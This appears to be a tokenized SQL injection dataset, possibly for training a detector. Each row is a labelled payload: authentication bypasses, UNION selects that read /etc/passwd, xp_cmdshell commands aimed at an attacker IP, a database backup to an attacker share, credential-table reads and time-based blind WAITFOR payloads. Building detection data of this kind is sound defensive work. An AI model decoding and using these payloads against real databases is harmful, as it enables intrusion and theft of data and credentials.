77,SQUT SMCLN EXECUTE IMMEDIATE SQUT sel SQUT BITOR BITOR SQUT ect us SQUT BITOR BITOR SQUT er SQUT,injection
78,EXEC xp,injection
79,SQUT SMCLN EXEC xp_regread,injection
80,SQUT GROUP BY userid HAVING INT EQ INT MINUS MINUS,injection
81,HANDLER,injection
82,HAVING,injection
83,SQUT HAVING INT EQ INT MINUS MINUS,injection
84,hi OR INT EQ INT MINUS MINUS DQUT,injection
85,hi SQUT OR INT EQ INT MINUS MINUS,injection
86,DQUT hi DQUT DQUT RPRN OR LPRN DQUT DQUT A DQUT DQUT EQ DQUT DQUT A DQUT,injection
87,hi OR A EQ A,injection
88,hi SQUT OR SQUT A SQUT EQ SQUT A,injection
89,hi SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,injection
90,SQUT hi SQUT OR SQUT x SQUT EQ SQUT x SQUT SMCLN,injection
91,INSERT,injection
92,LIKE,injection
93,LIMIT,injection
94,STAR LPRN BITOR LPRN mail EQ STAR RPRN RPRN,injection
95,STAR LPRN BITOR LPRN objectclass EQ STAR RPRN RPRN,injection
96,OR,injection
97,SQUT OR SQUT SQUT EQ SQUT,injection
98,OR INT EQ INT HASH DQUT,injection
99,SQUT OR INT EQ INT MINUS MINUS,injection
100,SQUT OR INT EQ INT HASH,injection
101,DQUT OR INT EQ INT MINUS MINUS,injection
102,OR INT EQ INT MINUS MINUS,injection
103,OR INT EQ INT HASH,injection
104,SQUT OR INT MINUS MINUS SQUT,injection
105,SQUT OR INT SLSH STAR,injection
106,SMCLN OR SQUT INT SQUT EQ SQUT INT SQUT,injection
107,SQUT OR SQUT INT SQUT EQ SQUT INT,injection
108,SQUT OR SQUT INT SQUT EQ SQUT INT SQUT MINUS MINUS,injection
109,SQUT OR INT EQ INT,injection
110,SQUT OR INT EQ INT SLSH STAR,injection
111,SQUT OR INT EQ INT MINUS MINUS,injection
112,SQUT OR INT EQ INT MINUS MINUS,injection
113,SQUT SLSH STAR STAR SLSH OR SLSH STAR STAR SLSH INT SLSH STAR STAR SLSH EQ SLSH STAR STAR SLSH INT,injection
114,â€˜ OR INT EQ INT MINUS MINUS,injection
115,DQUT OR INT EQ INT MINUS MINUS,injection
116,OR INT EQ INT,injection
117,OR INT EQ INT MINUS MINUS,injection
118,OR INT EQ INT OR DQUT DQUT EQ,injection
119,SQUT OR INT EQ INT OR SQUT SQUT EQ SQUT,injection
120,SQUT OR INT IN LPRN SELECT ATR ATR VERSION RPRN MINUS MINUS,injection
121,OR PRCNT INT EQ INT,injection
122,OR PRCNT INT EQ INT MINUS MINUS,injection
123,SQUT OR INT GT INT,injection
124,SQUT OR INT BETWEEN INT AND INT,injection
125,SQUT OR INT EQ INT,injection
126,â€˜ OR INT EQ INT MINUS MINUS,injection
127,SQUT OR SQUT INT SQUT EQ SQUT INT,injection
128,OR A EQ A,injection
129,OR A EQ A,injection
130,SQUT OR SQUT A SQUT EQ SQUT A,injection
131,SQUT OR A EQ A MINUS MINUS,injection
132,SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,injection
133,DQUT OR DQUT A DQUT EQ DQUT A,injection
134,RPRN OR LPRN A EQ A,injection
135,ORDER BY,injection
136,SQUT OR LPRN EXISTS RPRN,injection
137,OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,injection
138,DQUT OR ISNULL LPRN INT SLSH INT RPRN SLSH STAR,injection
139,SQUT OR SQUT something SQUT LIKE SQUT SOME PRCNT SQUT,injection
140,SQUT OR SQUT something SQUT EQ SQUT SOME SQUT PLUS SQUT thing SQUT,injection
141,SQUT OR SQUT TEXT SQUT EQ n SQUT TEXT SQUT,injection
142,SQUT OR SQUT TEXT SQUT GT SQUT T SQUT,injection
143,SQUT OR uid LIKE SQUT PRCNT,injection
144,SQUT OR uname LIKE SQUT PRCNT,injection
145,SQUT OR SQUT unusual SQUT EQ SQUT unusual SQUT,injection
146,SQUT OR userid LIKE SQUT PRCNT,injection
147,SQUT OR USER LIKE SQUT PRCNT,injection
148,SQUT OR username LIKE SQUT PRCNT,injection
149,SQUT OR username LIKE CHAR LPRN INT RPRN SMCLN,injection
150,SQUT OR SQUT whatever SQUT IN LPRN SQUT whatever SQUT RPRN,injection
151,SQUT MINUS MINUS BITAND PASSWORD EQ,injection
152,PASSWORD CLN STAR SLSH EQ INT MINUS MINUS,injection
153,print,injection
154,print ATR ATR variable,injection
155,PROCEDURE,injection
156,REPLACE,injection
157,SELECT,injection
158,SQUT SELECT STAR FROM information_schema DOT TABLES MINUS MINUS,injection
159,SQUT SELECT NAME FROM syscolumns WHERE ID EQ LPRN SELECT ID FROM sysobjects WHERE NAME EQ tablename SQUT RPRN MINUS MINUS,injection
160,SQUT LPRN SELECT top INT,injection
161,MINUS MINUS sp_password,injection
162,SQUT sqlattempt1,injection
163,LPRN sqlattempt2 RPRN,injection
164,SQUT sqlvuln,injection
165,SQUT PLUS sqlvuln,injection
166,LPRN sqlvuln RPRN,injection
167,sqlvuln SMCLN,injection
168,T SQUT EXEC master DOT DOT xp_cmdshell SQUT nslookup www DOT google DOT com SQUT MINUS MINUS,injection
169,to_timestamp_tz,injection
170,TRUNCATE,injection
171,tz_offset,injection
172,SQUT UNION ALL SELECT,injection
173,SQUT UNION ALL SELECT ATR ATR VERSION MINUS MINUS,injection
174,SQUT UNION SELECT,injection
175,uni SLSH STAR STAR SLSH ON sel SLSH STAR STAR SLSH ect,injection
176,SQUT UNION SELECT,injection
177,SQUT UNION SELECT INT CMMA load_file LPRN SQUT SLSH etc SLSH passwd SQUT RPRN CMMA INT CMMA INT CMMA INT SMCLN,injection
178,RPRN UNION SELECT STAR FROM information_schema DOT TABLES SMCLN,injection
179,SQUT UNION SELECT STAR FROM users WHERE login EQ CHAR LPRN INT CMMA INT CMMA INT CMMA INT RPRN SMCLN,injection
180,UPDATE,injection
181,SQUT BITOR BITOR utl_http DOT request,injection
182,CMMA ATR variable,injection
183,ATR variable,injection
184,ATR var SELECT ATR var AS var INTO TEMP END MINUS MINUS,injection
185,BSLSH x27union SELECT,injection
186,x SQUT AND INT EQ LPRN SELECT COUNT LPRN STAR RPRN FROM tabname RPRN SMCLN MINUS MINUS,injection
187,x SQUT AND email IS NULL SMCLN MINUS MINUS,injection
188,x SQUT AND members DOT email IS NULL SMCLN MINUS MINUS,injection
189,x SQUT AND userid IS NULL SMCLN MINUS MINUS,injection
190,x SQUT OR INT EQ INT OR SQUT x SQUT EQ SQUT y,injection
191,x SQUT OR full_name LIKE SQUT PRCNT bob PRCNT,injection
192,ã½ OR INT EQ INT MINUS MINUS,injection
0,SELECT versionnumber CMMA version_timestamp FROM sysibm DOT sysversions SMCLN,injection
1,SELECT USER FROM sysibm DOT sysdummy1 SMCLN,injection
2,SELECT SESSION_USER FROM sysibm DOT sysdummy1 SMCLN,injection
3,SELECT SYSTEM_USER FROM sysibm DOT sysdummy1 SMCLN,injection
4,SELECT CURRENT SERVER FROM sysibm DOT sysdummy1 SMCLN,injection
5,SELECT NAME FROM sysibm DOT systables SMCLN,injection
6,SELECT grantee FROM syscat DOT dbauth SMCLN,injection
7,SELECT STAR FROM syscat DOT tabauth SMCLN,injection
8,SELECT STAR FROM syscat DOT dbauth WHERE grantee EQ CURRENT USER SMCLN,injection
9,SELECT STAR FROM syscat DOT tabauth WHERE grantee EQ CURRENT USER SMCLN,injection
10,SELECT NAME CMMA tbname CMMA coltype FROM sysibm DOT syscolumns SMCLN,injection
11,SELECT schemaname FROM syscat DOT schemata SMCLN,injection
0,SELECT ATR ATR VERSION,injection
1,SELECT ATR ATR servernamee,injection
2,SELECT ATR ATR microsoftversione,injection
3,SELECT STAR FROM master DOT DOT sysserverse,injection
4,SELECT STAR FROM sysusers,injection
5,EXEC master DOT DOT xp_cmdshell SQUT ipconfig PLUS SLSH ALL SQUT,injection
6,EXEC master DOT DOT xp_cmdshell SQUT net PLUS VIEW SQUT,injection
7,EXEC master DOT DOT xp_cmdshell SQUT net PLUS users SQUT,injection
8,EXEC master DOT DOT xp_cmdshell SQUT ping PLUS LT attackerip GT SQUT,injection
9,backup DATABASE master TO disks EQ SQUT BSLSH BSLSH LT attackerip GT BSLSH LT attackerip GT BSLSH backupdb DOT dat SQUT,injection
10,CREATE TABLE myfile LPRN line VARCHAR LPRN INT RPRN RPRN DQUT bulk INSERT foo FROM SQUT C CLN BSLSH inetpub BSLSH wwwroot BSLSH auth DOT aspâ SQUT DQUT SELECT STAR FROM myfile DQUT MINUS MINUS,injection
0,LT username GT SQUT OR INT EQ INT MINUS MINUS,injection
1,SQUT OR SQUT SQUT EQ SQUT allows authentication WITHOUT A VALID username DOT,injection
2,LT username GT SQUT MINUS MINUS,injection
3,SQUT UNION SELECT INT CMMA SQUT LT USER MINUS fieldname GT SQUT CMMA SQUT LT pass MINUS fieldname GT SQUT INT MINUS MINUS,injection
4,SQUT OR INT EQ INT MINUS MINUS,injection
0,CREATE TABLE myfile LPRN INPUT TEXT RPRN SMCLN LOAD DATA INFILE SQUT LT filepath GT SQUT INTO TABLE myfile SMCLN SELECT STAR FROM myfile SMCLN,injection
0,SELECT VERSION LPRN RPRN SMCLN,injection
1,SELECT current_database LPRN RPRN SMCLN,injection
2,SELECT CURRENT_USER SMCLN,injection
3,SELECT SESSION_USER SMCLN,injection
4,SELECT current_setting LPRN SQUT log_connections SQUT RPRN SMCLN,injection
5,SELECT current_setting LPRN SQUT log_statement SQUT RPRN SMCLN,injection
6,SELECT current_setting LPRN SQUT port SQUT RPRN SMCLN,injection
7,SELECT current_setting LPRN SQUT password_encryption SQUT RPRN SMCLN,injection
8,SELECT current_setting LPRN SQUT krb_server_keyfile SQUT RPRN SMCLN,injection
9,SELECT current_setting LPRN SQUT virtual_host SQUT RPRN SMCLN,injection
10,SELECT current_setting LPRN SQUT port SQUT RPRN SMCLN,injection
11,SELECT current_setting LPRN SQUT config_file SQUT RPRN SMCLN,injection
12,SELECT current_setting LPRN SQUT hba_file SQUT RPRN SMCLN,injection
13,SELECT current_setting LPRN SQUT data_directory SQUT RPRN SMCLN,injection
14,SELECT STAR FROM pg_shadow SMCLN,injection
15,SELECT STAR FROM pg_group SMCLN,injection
16,CREATE TABLE myfile LPRN INPUT TEXT RPRN SMCLN,injection
17,COPY myfile FROM SQUT SLSH etc SLSH passwd SQUT SMCLN,injection
18,SELECT STAR FROM myfile SMCLN COPY myfile TO SLSH tmp SLSH test SMCLN,injection
0,RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
1,RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
2,SQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
3,SQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
4,DQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
5,DQUT RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
6,RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
7,RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
8,SQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
9,SQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
10,DQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
11,DQUT RPRN RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
12,CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
13,CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
14,SQUT CMMA NULL RPRN PRCNT 20waifor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
15,SQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
16,DQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
17,DQUT CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
18,RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
19,RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
20,SQUT RPRN CMMA NULL RPRN PRCNT 20waifor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
21,SQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
22,DQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
23,DQUT RPRN CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
24,CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
25,CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
26,SQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
27,SQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
28,DQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
29,DQUT CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
30,RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
31,RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
32,SQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
33,SQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
34,DQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
35,DQUT RPRN CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
36,CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
37,CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
38,SQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
39,SQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
40,DQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
41,DQUT CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
42,RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
43,RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
44,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
45,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
46,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
47,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
48,CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
49,CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
50,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
51,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
52,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
53,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
54,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
55,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
56,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
57,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
58,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
59,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
60,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
61,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
62,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
63,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
64,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
65,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
66,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
67,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
68,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
69,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
70,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
71,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
72,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
73,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
74,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
75,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
76,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
77,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
78,RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
79,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
80,SQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
81,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
82,DQUT RPRN CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
83,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
84,CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
85,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
86,SQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT MINUS MINUS,injection
87,DQUT CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL RPRN PRCNT 20waitfor PRCNT 20delay PRCNT INT SQUT INT CLN INT CLN INT SQUT PRCNT INT SLSH STAR,injection
